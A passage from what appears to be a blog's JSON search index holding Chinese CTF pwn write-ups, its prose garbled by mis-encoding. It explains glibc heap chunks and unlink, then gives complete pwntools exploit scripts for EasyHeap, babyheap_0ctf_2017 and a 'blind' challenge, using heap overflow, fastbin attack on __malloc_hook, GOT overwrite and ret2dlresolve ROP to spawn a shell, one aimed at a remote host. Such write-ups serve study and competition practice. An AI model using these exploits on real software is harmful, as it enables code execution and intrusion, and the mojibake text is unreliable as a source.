ˆæ˜¯ç”±é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿ã€‚\n\nå †å¯ä»¥ç”³è¯·çš„å†…å­˜ç©ºé—´æ¯”æ ˆè¦å¤§å¾ˆå¤šï¼Œå †åœ¨linuxçš„4Gçš„è™šæ‹Ÿç©ºé—´é‡Œé¢æœ€é«˜å¯ç”³è¯·2.9Gç©ºé—´\n\nå †çš„æ“ä½œæ˜¯ç”±å †ç®¡ç†å™¨ï¼ˆptmalloc2ï¼‰æ¥å®ç°ï¼Œå¹¶ä¸æ˜¯ç”±æ“ä½œç³»ç»Ÿå†…æ ¸ç®¡ç†ã€‚å› ä¸ºç¨‹åºæ¯æ¬¡ç”³è¯·æˆ–é‡Šæ”¾å †æ—¶éƒ½éœ€è¦è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œç³»ç»Ÿè°ƒç”¨çš„å¼€é”€å·¨å¤§ï¼Œé¢‘ç¹è¿›è¡Œå †æ“ä½œæ—¶ï¼Œä¼šä¸¥é‡å½±å“ç¨‹åºçš„æ€§èƒ½ã€‚\n\n\nå †çš„åŸºæœ¬ç»“æ„1.pre_sizeå­—æ®µï¼šåªæœ‰å½“å‰é¢ä¸€ä¸ªå †å—æ˜¯ç©ºé—²æ—¶æ‰æœ‰å€¼ï¼Œç”¨æ¥æŒ‡ç¤ºå‰é¢ä¸€ä¸ªå †å—çš„å¤§å°ã€‚å½“å‰é¢çš„å †å—åœ¨ä½¿ç”¨æ—¶ï¼Œå®ƒçš„å€¼ä¸º0\n2.sizeå­—æ®µï¼šç”¨æ¥æŒ‡ç¤ºå½“å‰å †å—çš„å¤§å°ï¼ˆåŒ…æ‹¬å¤´éƒ¨ä»¥åŠuser dataçš„å¤§å°ï¼‰ã€‚æœ€åä¸‰ä½ç›¸å½“äºä¸‰ä¸ªflagï¼š\n\nNON_MAIN_ARENAï¼šåˆ¤æ–­è¿™ä¸ªå †å—æ˜¯å¦ä½äºä¸»çº¿ç¨‹\n\nIS_MAPPEDï¼šè®°å½•å½“å‰chunkæ˜¯å¦ç”±mmapåˆ†é…\n\nPREV_INUSEï¼šè®°å½•å½“å‰chunkå—æ˜¯å¦åŒ—åˆ†é…ï¼ˆå¦‚æœè¢«åˆ†é…è¿™ä¸ªå­—æ®µçš„å€¼ä¸º1ï¼Œæ‰€ä»¥ç»å¸¸ä¼šåœ¨å·²åˆ†é…çš„å †å—ä¸­çš„sizeæ¯”åŸæ¥å¤§1ä¸ªå­—èŠ‚\n\n\n3.fdï¼Œbkã€‚ chunk å¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼Œä» fd å­—æ®µå¼€å§‹æ˜¯ç”¨æˆ·çš„æ•°æ®ã€‚chunk ç©ºé—²æ—¶ï¼Œä¼šè¢«æ·»åŠ åˆ°å¯¹åº”çš„ç©ºé—²ç®¡ç†é“¾è¡¨ä¸­ï¼Œå…¶å­—æ®µçš„å«ä¹‰å¦‚ä¸‹\n\nfd æŒ‡å‘ä¸‹ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk\nbk æŒ‡å‘ä¸Šä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunk\n\né€šè¿‡ fd å’Œ bk å¯ä»¥å°†ç©ºé—²çš„ chunk å—åŠ å…¥åˆ°ç©ºé—²çš„ chunk å—é“¾è¡¨è¿›è¡Œç»Ÿä¸€ç®¡ç†\n4.fd_nextsizeï¼Œ bk_nextsizeï¼Œä¹Ÿæ˜¯åªæœ‰ chunk ç©ºé—²çš„æ—¶å€™æ‰ä½¿ç”¨ï¼Œä¸è¿‡å…¶ç”¨äºè¾ƒå¤§çš„ chunkï¼ˆlarge chunkï¼‰ã€‚\nfd_nextsize æŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚\nbk_nextsize æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆã€‚\nä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå†ã€‚\n\nbinsè¿™äº›å°±ä¸å¤šèµ˜è¿°äº†ï¼Œctfwikiä¸Šé¢è®²çš„æ¯”æˆ‘çš„å¥½\nUnlinkæœºåˆ¶unlinkæ˜¯å †æº¢å‡ºä¸­çš„ä¸€ç§å¸¸è§çš„åˆ©ç”¨å½¢å¼ï¼Œé€šè¿‡å°†åŒå‘åˆ—è¡¨ä¸­çš„ç©ºé—²å—æ‹¿å‡ºæ¥ä¸å°†è¦freeçš„ç‰©ç†ç›¸é‚»çš„å—è¿›è¡Œåˆå¹¶ã€‚\nå¦‚ä½•è§¦å‘unlinkå½“ä½¿ç”¨freeå‡½æ•°é‡Šæ”¾æ­£åœ¨ä½¿ç”¨çš„chunkæ—¶ï¼Œä¼šç›¸åº”åœ°æ£€æŸ¥å…¶ç›¸é‚»çš„chunkæ˜¯å¦ä¸ºç©ºé—²ï¼Œå¦‚æœä¸ºç©ºé—²åˆ™ä¼šå°†ç›¸é‚»çš„chunkä¸freeçš„chunkè¿›è¡Œåˆ\nå®æ“è¿™é‡Œæ‹¿buuctfä¸­[ZJCTF 2019]EasyHeapæ¥è®²ã€‚å…ˆçœ‹åæ±‡ç¼–ï¼Œç¨‹åºæœ‰createã€editå’ŒdeleteåŠŸèƒ½ï¼Œæ²¡æœ‰showåŠŸèƒ½\n\nä»”ç»†è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œé¦–å…ˆå­˜åœ¨æ¼æ´å‡½æ•°ï¼Œç›´æ¥å¯ä»¥è·å–flagï¼Œä½†æ˜¯éœ€è¦æ»¡è¶³magicå¤§äº4869ä¸”choice=4869æ‰è¡Œ\n\nç»§ç»­åˆ†æï¼Œå‘ç°å­˜åœ¨å †æº¢å‡ºæ¼æ´ï¼Œåœ¨editæ—¶ä¸ä¼šæ£€æŸ¥é‡å†™å…¥çš„å¤§å°ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´å †æº¢å‡ºã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å †æº¢å‡ºä¿®æ”¹chunkæŒ‡å‘magicä»è€Œè¾¾åˆ°ä¿®æ”¹çš„ç›®çš„ã€‚\né¦–å…ˆåˆ›å»ºä¸‰ä¸ªchunk\n12345create(0x10,&#x27;a&#x27;*0x10)#idx0create(0x80,&#x27;b&#x27;*0x10)#idx1  unsorted bin create(0x80,&#x27;c&#x27;*0x10)#idx2  é˜²æ­¢äºtop chunkåˆå¹¶delete(1)edit(0,0x30,&#x27;d&#x27;*0x18+p64(0x91)+p64(0)+p64(magic-0x10))#é€šè¿‡å †æº¢å‡ºæ¥ä¼ªé€ chunk\n\nåˆ›å»ºchunk2æ—¶é˜²æ­¢free chunk1çš„æ—¶å€™ä¸top chunkåˆå¹¶ã€‚ç„¶åé€šè¿‡ä¿®æ”¹chunk0ï¼Œæ¥è¦†ç›–chunk1çš„bkæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬æƒ³è¦æ”¹å˜æ•°å€¼å¤§å°çš„magicåœ°å€-0x10å¤„ã€‚\n\nä¹‹åå†ç”³è¯·0x80å¤§å°çš„chunkï¼Œä¼šå°†chunk1è¿”è¿˜ç»™æˆ‘ä»¬ï¼Œæ­¤æ—¶unsorted biné‡Œå°±å‰©ä¸‹æˆ‘ä»¬ä¼ªé€ çš„chunkï¼Œè€Œæ­¤chunkçš„çš„èµ·å§‹åœ°å€å°±æ˜¯magicåœ°å€-0x10ï¼ŒåŸºäºunsorted binçš„æœºåˆ¶ï¼Œè¯¥fake chunkçš„fdæŒ‡é’ˆå°±ä¼šæŒ‡å‘unsorted binæœ¬èº«ã€‚\n1create(0x80,&#x27;b&#x27;*0x10)#idx1  unsorted bin\n\n\nä¹‹åchoiceæ—¶é€‰æ‹©4869å³å¯è·å–flagã€‚ä½†æ˜¯å› ä¸ºbuuctfæ²¡æœ‰å¯¹åº”çš„æ–‡ä»¶å¤¹æ‰€ä»¥ä¼šæ‹¿ä¸åˆ°flagï¼Œéœ€è¦å¦è¾Ÿè¹Šå¾„ã€‚\nè¿™ä¸€æ¬¡æˆ‘ä»¬é‡‡å–unlinkçš„æ–¹æ³•ã€‚å°†chunk1çš„å€¼ä¿®æ”¹ä¸ºè‡ªèº«åœ°å€å‡å»0x18ï¼Œè¿™æ ·é€šè¿‡åœ¨ç›®æ ‡åœ°å€æ—¶å†™å…¥å€¼çš„æ—¶å€™åŠ ä¸Š0x18çš„paddingå°±å¯ä»¥å¯¹è¯¥å†…å­˜åœ°å€çš„æ•°æ®è¿›è¡Œä¿®æ”¹ã€‚æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾ä¸€ä¸ªåˆé€‚çš„åœ°å€ï¼Œèƒ½å¤Ÿç”³è¯·å¹¶ä¸”ä¿®æ”¹åˆ°heaparrayï¼Œå†åˆ©ç”¨ä¿®æ”¹çš„heaparrayä¿®æ”¹freeä¸ºsystemï¼Œä¹‹åfree(chunk2)å°±å˜æˆäº†system(chunk2)ï¼Œåœ¨ç”³è¯·chunk2æ—¶å¡«å…¥/bin/shå°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚\n\nå®Œæ•´exp\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from pwn import *context.log_level = &#x27;debug&#x27;p = process(&quot;./easyheap&quot;)#p = remote(&#x27;node4.buuoj.cn&#x27;,28124)elf = ELF(&#x27;easyheap&#x27;)heaparray = 0x6020E0free_got = elf.got[&#x27;free&#x27;]system_plt = elf.plt[&#x27;system&#x27;]def create(size,content):\tp.recvuntil(&quot;Your choice :&quot;)\tp.sendline(str(1))\tp.recvuntil(&quot;Size of Heap : &quot;)\tp.sendline(str(size))\tp.recvuntil(&quot;Content of heap:&quot;)\tp.sendline(content)\tp.recvuntil(&quot;SuccessFul&quot;)def delete(index):\tp.recvuntil(&quot;Your choice :&quot;)\tp.sendline(str(3))\tp.recvuntil(&quot;Index :&quot;)\tp.sendline(str(index))\tp.recvuntil(&quot;Done !&quot;)def edit(index,size,content):\tp.recvuntil(&quot;Your choice :&quot;)\tp.sendline(str(2))\tp.recvuntil(&quot;Index :&quot;)\tp.sendline(str(index))\tp.recvuntil(&quot;Size of Heap : &quot;)\tp.sendline(str(size))\tp.recvuntil(&quot;Content of heap : &quot;)\tp.sendline(content)\tp.recvuntil(&quot;Done !&quot;)create(0x10,&#x27;a&#x27;*0x10)#idx0create(0x60,&#x27;b&#x27;*0x10)#idx1  create(0x10,&#x27;/bin/sh\\x00&#x27;)#idx2delete(1)#gdb.attach(p)payload = &#x27;a&#x27;*0x18+p64(0x71)+p64(0x6020ad)edit(0,len(payload),payload)create(0x60,&#x27;aaaa&#x27;)#idx1create(0x60,&#x27;a&#x27;*0x23+p64(free_got))#fakechunkedit(0,8,p64(system_plt))p.recvuntil(&quot;Your choice :&quot;)p.sendline(str(3))p.recvuntil(&quot;Index :&quot;)p.sendline(str(2))p.interactive()\n\n\n\n\n\nå®æ“å°±æ‹¿buuä¸Šé¢babyheap_0ctf_2017ä¸€é¢˜æ¥è®²\ncheckä¸€ä¸‹ï¼Œ64ä½å…¨ä¿æŠ¤\n\nåæ±‡ç¼–çœ‹çœ‹\nå­˜åœ¨å †æº¢å‡º\nå †æº¢å‡ºä¸åƒæ ˆæº¢å‡ºï¼Œæ ˆæº¢å‡ºå¯ä»¥é€šè¿‡æ„é€ ROPä»è€Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œè€Œå †æº¢å‡ºä¸èƒ½ç›´æ¥æ§åˆ¶ï¼Œå †æº¢å‡ºåªèƒ½ä»å½“å‰chunkè¦†ç›–ä¸‹ä¸€ä¸ªchunk\næ€è·¯æˆ‘ä»¬åº”è¯¥å¦‚ä½•æ§åˆ¶ç¨‹åºï¼Ÿå…¶å®åœ¨ç”³è¯·chunkæ—¶ï¼Œä¼šæ‰§è¡Œmalloc_hookå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹malloc_hookå‡½æ•°gotè¡¨ï¼Œè®©ä»–æ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‡½æ•°æˆ–è€…one_gadgetã€‚\næ‰€ä»¥ç°åœ¨æˆ‘ä»¬è¦è§£å†³çš„é—®é¢˜æ˜¯ï¼š\n\nå¦‚ä½•è·å–malloc_hookçš„gotè¡¨åœ°å€\nå¦‚ä½•ä¿®æ”¹malloc_hookçš„gotè¡¨\nå¦‚ä½•getshell\n\né—®é¢˜1ï¼š\næˆ‘ä»¬å¯ä»¥é€šè¿‡å †æº¢å‡ºè¦†ç›–åˆ°ä¸‹ä¸€ä¸ªchunkï¼Œä»è€Œè®©ä¸‹ä¸€ä¸ªchunkæŒ‡å‘main_arenaï¼Œå†ä½¿ç”¨dumpè¾“å‡ºå³å¯æ³„éœ²\né—®é¢˜2ï¼š\næˆ‘ä»¬å¯ä»¥freeæ‰ä¸­é—´ä¸€ä¸ªchunkï¼Œä¹‹ååˆ©ç”¨ä¸‹ä¸€ä¸ªchunkå®ç°å †æº¢å‡ºï¼Œä»è€Œä¿®æ”¹ä¸­é—´chunkçš„fdæŒ‡é’ˆæŒ‡å‘å«main_arenaçš„gotè¡¨çš„chunkï¼Œæˆ‘ä»¬åªè¦å†ç”³è¯·ç›¸åŒå¤§å°çš„chunkå°±å¯ä»¥åˆ©ç”¨fillå‡½æ•°ä¿®æ”¹malloc_hookçš„gotè¡¨\né—®é¢˜3ï¼š\nä¿®æ”¹malloc_hookçš„gotè¡¨ä¸ºone_gadgetï¼Œä¹‹åæˆ‘ä»¬å†ç”³è¯·ä¸€ä¸ªchunkæ—¶ï¼Œå°±ä¼šæ‰§è¡Œone_gadgetä»è€Œè·å–shell\næ¥ä¸‹æ¥å¼€å§‹æ“ä½œ\nå…ˆæ ¹æ®åæ±‡ç¼–å†™å‡ºå¯¹åº”çš„å‡½æ•°\n12345678910111213141516171819202122def alloc(size):    p.recvuntil(&#x27;Command:&#x27;)    p.sendline(&#x27;1&#x27;)    p.sendline(str(size))def fill(idx,payload):    p.recvuntil(&#x27;Command:&#x27;)    p.sendline(&#x27;2&#x27;)     p.sendline(str(idx))    p.sendline(str(len(payload)))    p.send(payload)     def free(idx):    p.recvuntil(&#x27;Command:&#x27;)    p.sendline(&#x27;3&#x27;)    p.sendline(str(idx))       def dump(idx):    p.recvuntil(&#x27;Command:&#x27;)     p.sendline(&#x27;4&#x27;)    p.sendline(str(idx))        p.recvuntil(&#x27;Content: \\n&#x27;)\n\nç”³è¯·å››ä¸ªchunkï¼Œé˜²æ­¢chunkè¢«freeåä¸topchunkåˆå¹¶\n1234alloc(0x60)#0alloc(0x60)#1alloc(0x40)#2alloc(0x20)#3\n\næ¥ä¸‹æ¥å°±æ˜¯å †æº¢å‡ºä¿®æ”¹chunk1çš„sizeå¤§å°ï¼Œfreeåè¾“å‡ºchunk2è·å–main_arena\n123fill(0,b&#x27;a&#x27;*0x68+p64(0xc1))free(1)alloc(0x60)#1\n\nè¿™æ ·chunk2å°±ä¼šä¸€èµ·è¿›å…¥fastbinï¼Œä½†æ˜¯chunk2å¹¶æ²¡æœ‰è¢«æ¸…ç©º\nå½“chunk1å’Œchunk2è¿›å…¥fastbinåï¼Œå†æ¬¡ç”³è¯·chunk1å¤§å°çš„chunkåï¼Œchunk1ä¼šç¦»å¼€fastbinï¼Œä¹‹åchunk2å°±ä¼šæŒ‡å‘main_arean+88\n\nå› ä¸ºchunk2æ²¡æœ‰è¢«æ¸…ç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¾“å‡ºchunk2ï¼Œä»è€Œè·å–main_areançš„åœ°å€ï¼Œè¿›è€Œè·å–malloc_chunkçš„åœ°å€\n1234dump(2)libc_base = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))-main_are-88print(hex(libc_base))malloc_chunk = libc.symbols[&quot;__malloc_hook&quot;]+libc_base\n\næ¥ä¸‹æ¥åˆ©ç”¨æ€è·¯ä¸»è¦æ˜¯double freeï¼šfree(1)change chunk1çš„fdæŒ‡é’ˆ,ç¬¬äºŒæ¬¡ç”³è¯·åˆ°çš„å°±æ˜¯fakechunk ï¼Œå¡«å…… malloc hookè¦†ç›–æŒ‡é’ˆä¸ºonegadget\n12345free(1)fill(0,b&#x27;a&#x27;*0x60+p64(0)+p64(0x71)+p64(malloc_chunk-0x23))alloc(0x60)#1alloc(0x60)#5fill(5,b&#x27;aaa&#x27;+b&#x27;a&#x27;*0x10+p64(ogg[1]+libc_base)) \n\nmalloc_hookåœ¨chunkå¤´åé¢23å­—èŠ‚å¤„ï¼Œæ‰€ä»¥ç”¨æˆ·è¾“å…¥ä½ç½®åœ¨23-size=13çš„ä½ç½®ï¼Œæ‰€ä»¥å¡«å……13å­—èŠ‚åä¿®æ”¹æˆone_gadgetå³å¯\nEXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import*p = process(&quot;./babyheap&quot;)libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#p = remote(&#x27;node4.buuoj.cn&#x27;,28886)#context.log_level = &#x27;debug&#x27;#libc=ELF(&quot;/home/krito/CTF/buu/libc/libc-2.23.so&quot;)main_are =0x3c4b20def alloc(size):    p.recvuntil(&#x27;Command:&#x27;)    p.sendline(&#x27;1&#x27;)    p.sendline(str(size))def fill(idx,payload):    p.recvuntil(&#x27;Command:&#x27;)    p.sendline(&#x27;2&#x27;)     p.sendline(str(idx))    p.sendline(str(len(payload)))    p.send(payload)     def free(idx):    p.recvuntil(&#x27;Command:&#x27;)    p.sendline(&#x27;3&#x27;)    p.sendline(str(idx))       def dump(idx):    p.recvuntil(&#x27;Command:&#x27;)     p.sendline(&#x27;4&#x27;)    p.sendline(str(idx))        p.recvuntil(&#x27;Content: \\n&#x27;)#log.success(&quot;-----------------------leak libc-------------------------&quot;)ogg = [0x45226,0x4527a,0xf03a4,0xf1247]alloc(0x60)#0alloc(0x60)#1alloc(0x40)#2alloc(0x20)#3fill(0,b&#x27;a&#x27;*0x68+p64(0xc1))free(1)alloc(0x60)#1#gdb.attach(p)dump(2)libc_base = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))-main_are-88print(hex(libc_base))malloc_chunk = libc.symbols[&quot;__malloc_hook&quot;]+libc_basealloc(0x40)#2free(1)fill(0,b&#x27;a&#x27;*0x60+p64(0)+p64(0x71)+p64(malloc_chunk-0x23))alloc(0x60)#1alloc(0x60)#5fill(5,b&#x27;aaa&#x27;+b&#x27;a&#x27;*0x10+p64(ogg[1]+libc_base))#gdb.attach(p)alloc(0x100)p.interactive()\n\n\n\n","slug":"å †","date":"2021-11-23T14:10:20.000Z","categories_index":"pwn","tags_index":"ç¬”è®°","author_index":"Krito"},{"id":"08ca8a643d07b9ceeb8a1eb3cf2f50b4","title":"è¥¿æ¹–è®ºå‰‘pwnå¤ç°","content":"\n\n\n\n\n\n\n\n\nç¬¬ä¸€æ¬¡å‚åŠ è¥¿æ¹–è®ºå‰‘ï¼ŒæŠ€æœ¯ä¸å¤Ÿï¼Œä¸€é¢˜æ²¡å‡ºï¼Œå¸Œæœ›æ˜å¹´èƒ½å¤Ÿå‡ºä¸ªä¸¤ä¸‰é“\nblindå¬darryğŸ‘´è¯´è¿œç«¯çš„libcè¢«é­”æ”¹äº†ï¼Œå¯¹ä¸ä¸Šï¼ŒåŠ ä¸Šæ²¡æœ‰è¿œç«¯ç¯å¢ƒï¼Œæ‰€ä»¥æˆ‘å°±è®²ä¸€ä¸‹æœ¬åœ°å¦‚ä½•æ‰“é€šçš„ã€‚ï¼ˆå…¨ç¨‹darryğŸ‘´è®²è§£ï¼‰\n\næˆ‘ä¸€å¼€å§‹æ²¡æ³¨æ„åˆ°å¼€äº†NXä¿æŠ¤ï¼Œæ‰€ä»¥æƒ³åˆ©ç”¨æ„é€ readå‡½æ•°è®©å‡½æ•°è·³è½¬æ‰§è¡Œshellcodeï¼Œå¯¼è‡´ç™½æ‰“å‡ ä¸ªå°æ—¶ã€‚ï¼ˆä¹Ÿæ˜¯å¤ªèœäº†ï¼Œå•¥ä¹Ÿä¸æ‡‚ï¼‰èµ›åï¼Œçœ‹darryğŸ‘´EXPï¼Œå‘ç°alarmå‡½æ•°ä¸‹é¢æ˜¯syscallï¼Œåªéœ€è¦ä¿®æ”¹alarmçš„gotè¡¨ä¸ºsyscallï¼Œä¹‹åæ„é€ execve(â€˜/bin/shâ€™,0,0)å°±è¡Œã€‚\n\næˆ‘ä»¬åªéœ€è¦ä¿®æ”¹alarmå‡½æ•°æœ€åä¸€å­—èŠ‚ä¸ºsyscallçš„æœ€åä¸€å­—èŠ‚å°±è¡Œï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ„å»ºreadå‡½æ•°ä¿®æ”¹gotè¡¨\nåˆ©ç”¨initå‡½æ•°çš„ä¸¤ä¸ªgadgetæ„å»ºreadå‡½æ•°ä¿®æ”¹gotè¡¨\n1234def gadget(addr,di,si,dx):\tpay=p64(0x4007BA)+p64(0)+p64(1)+p64(addr)+p64(dx)+p64(si)+p64(di)+p64(0x4007A0)+b&#x27;a&#x27;*7*8\treturn paypayload += gadget(elf.got[&quot;read&quot;],0,elf.got[&quot;alarm&quot;],1)\n\nä¹‹åï¼Œåˆ©ç”¨readå‡½æ•°å°†/bin/sh/å­˜å…¥bssæ®µ\n1payload += gadget(elf.got[&quot;read&quot;],0,0x601088,0x3b)\n\næœ€åæ„å»ºexecve(â€˜/bin/shâ€™,0,0)\n1payload += gadget(elf.got[&quot;alarm&quot;],0x601088,0,0)\n\n\n\nEXP11234567891011121314151617181920from pwn import *#from LibSearcher import *context.log_level = &quot;debug&quot;s = lambda buf: io.send(buf)shell = lambda: io.interactive()io=process(&quot;./blind&quot;)elf = ELF(&quot;./blind&quot;)def gadget(addr,di,si,dx):\tpay=p64(0x4007BA)+p64(0)+p64(1)+p64(addr)+p64(dx)+p64(si)+p64(di)+p64(0x4007A0)+b&#x27;a&#x27;*7*8\treturn paypayload = b&quot;a&quot; * 0x58payload += gadget(elf.got[&quot;read&quot;],0,elf.got[&quot;alarm&quot;],1)payload += gadget(elf.got[&quot;read&quot;],0,0x601088,0x3b)payload += gadget(elf.got[&quot;alarm&quot;],0x601088,0,0)payload += (0x500 - len(payload)) * b&quot;\\x00&quot;#gdb.attach(io)s(payload)s(&quot;\\x19&quot;)s(&quot;/bin/sh\\x00&quot; + &quot;a&quot; * (0x3b-8))shell()\n\nEXP2darryğŸ‘´åˆ©ç”¨ret2dlresloveçš„æ–¹æ³•ä¹Ÿæ‰“é€šäº†æœ¬åœ°ï¼Œä¸è¿‡å› ä¸ºè¿œç«¯çš„libcæ‰€ä»¥æ²¡æ‰“é€šï¼Œæˆ‘è¿˜æ²¡æ¶ˆåŒ–å®Œï¼Œç›´æ¥ä¸ŠEXPäº†\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124#coding=utf-8from pwn import *from LibcSearcher import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;)binary=&#x27;./blind&#x27;main_arena = 0x3ebc40s = lambda buf: io.send(buf)sl = lambda buf: io.sendline(buf)sa = lambda delim, buf: io.sendafter(delim, buf)sal = lambda delim, buf: io.sendlineafter(delim, buf)shell = lambda: io.interactive()r = lambda n=None: io.recv(n)ra = lambda t=tube.forever:io.recvall(t)ru = lambda delim: io.recvuntil(delim)rl = lambda: io.recvline()rls = lambda n=2**20: io.recvlines(n)su = lambda buf,addr:io.success(buf+&quot;==&gt;&quot;+hex(addr))local = 0\tif local == 1:    io=process(binary)else:    io=remote(&#x27;82.157.6.165&#x27;,27200)elf=ELF(binary)libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)one_gadget = [0x4f3d5,0x4f432,0x10a41c]read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]fun_addr = 0x4006B6  # main&#x27;&#x27;&#x27;Gadgets information============================================================0x00000000004007bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007be : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007c0 : pop r14 ; pop r15 ; ret0x00000000004007c2 : pop r15 ; ret0x00000000004007bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007bf : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400620 : pop rbp ; ret0x00000000004007c3 : pop rdi ; ret0x00000000004007c1 : pop rsi ; pop r15 ; ret0x00000000004007bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400549 : ret&#x27;&#x27;&#x27;# bssbss = elf.bss()l_addr = libc.sym[&#x27;write&#x27;] - libc.sym[&#x27;read&#x27;]#libc.sym[&#x27;system&#x27;] - libc.sym[&#x27;read&#x27;]r_offset = bss + l_addr * -1if l_addr &lt; 0:    l_addr = l_addr + 0x10000000000000000pop_rdi = 0x00000000004007c3# pop rsi ; pop r15 ; retpop_rsi = 0x00000000004007c1plt_load = 0x400556payload = b&#x27;a&#x27; * 0x58 + p64(pop_rsi) + p64(bss + 0x100) + p64(0) + p64(pop_rdi) + p64(0) + p64(read_plt) + p64(fun_addr)raw_input()sleep(1)io.sendline(payload)dynstr = 0x4003B8fake_link_map_addr = bss + 0x100fake_dyn_strtab_addr = fake_link_map_addr + 0x8fake_dyn_strtab = p64(0) + p64(dynstr)  # fake_link_map_addr + 0x8fake_dyn_symtab_addr = fake_link_map_addr + 0x18fake_dyn_symtab = p64(0) + p64(read_got - 0x8)  # fake_link_map_addr + 0x18fake_dyn_rel_addr = fake_link_map_addr + 0x28fake_dyn_rel = p64(0) + p64(fake_link_map_addr + 0x38)  # fake_link_map_addr + 0x28fake_rel = p64(r_offset) + p64(0x7) + p64(0)  # fake_link_map_addr + 0x38fake_link_map = p64(l_addr)fake_link_map += fake_dyn_strtabfake_link_map += fake_dyn_symtabfake_link_map += fake_dyn_relfake_link_map += fake_relfake_link_map = fake_link_map.ljust(0x68, b&#x27;\\x00&#x27;)fake_link_map += p64(fake_dyn_strtab_addr)fake_link_map += p64(fake_dyn_symtab_addr)  # fake_link_map_addr + 0x70fake_link_map += b&#x27;/bin/sh&#x27;.ljust(0x80, b&#x27;\\x00&#x27;)fake_link_map += p64(fake_dyn_rel_addr)sleep(1)io.sendline(fake_link_map)sleep(1)#gdb.attach(io)#raw_input()sleep(4)rop = b&#x27;A&#x27; * 0x58 + p64(pop_rdi) +p64(1)+p64(pop_rsi)+ p64(0x601018) + p64(0) +p64(plt_load) + p64(fake_link_map_addr) + p64(0)+p64(fun_addr)io.sendline(rop)leak = u64(ru(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))su(&#x27;alarm&#x27;,leak)leak = u64(ru(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))su(&#x27;read&#x27;,leak)leak = u64(ru(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))su(&#x27;__libc_start_main&#x27;,leak)leak = u64(ru(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))su(&#x27;setvbuf&#x27;,leak)libc = LibcSearcher(&#x27;setvbuf&#x27;, leak)libc_base = leak - libc.dump(&#x27;setvbuf&#x27;)leak = u64(ru(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))su(&#x27;sleep&#x27;,leak)pay = b&#x27;a&#x27;*0x58 + p64(pop_rdi) + p64(fake_link_map_addr + 0x78) + p64(libc_base + libc.dump(&#x27;system&#x27;))sl(pay)io.interactive()\n\n\n\næœ€åè®²ä¸€ä¸‹å¦‚ä½•æ‰“è¿œç«¯\nå…ˆåˆ©ç”¨EXP2æ³„éœ²è¿œç«¯çš„alarmå‡½æ•°åœ°å€ï¼Œå†å°†EXP1é‡Œé¢è¦ä¿®æ”¹çš„åœ°å€æ”¹æˆè¿œç«¯çš„å°±è¡Œï¼Œä¾‹å¦‚ä¸‹å›¾å°±æ˜¯å°†\\x19æ”¹æˆ\\xd5\n\n\n","slug":"è¥¿æ¹–è®ºå‰‘pwnå¤ç°","date":"2021-11-22T13:19:10.000Z","categories_index":"PWN","tags_index":"wp","author_index":"Krito"},{"id":"52662f34cef48ec0871eed4c3bef0137","title":"ctfshow-pwn","content":"pwn03å°†é™„ä»¶æ‹–è¿›IDAä¸­å¾ˆå®¹æ˜“å‘ç°å­˜åœ¨æ 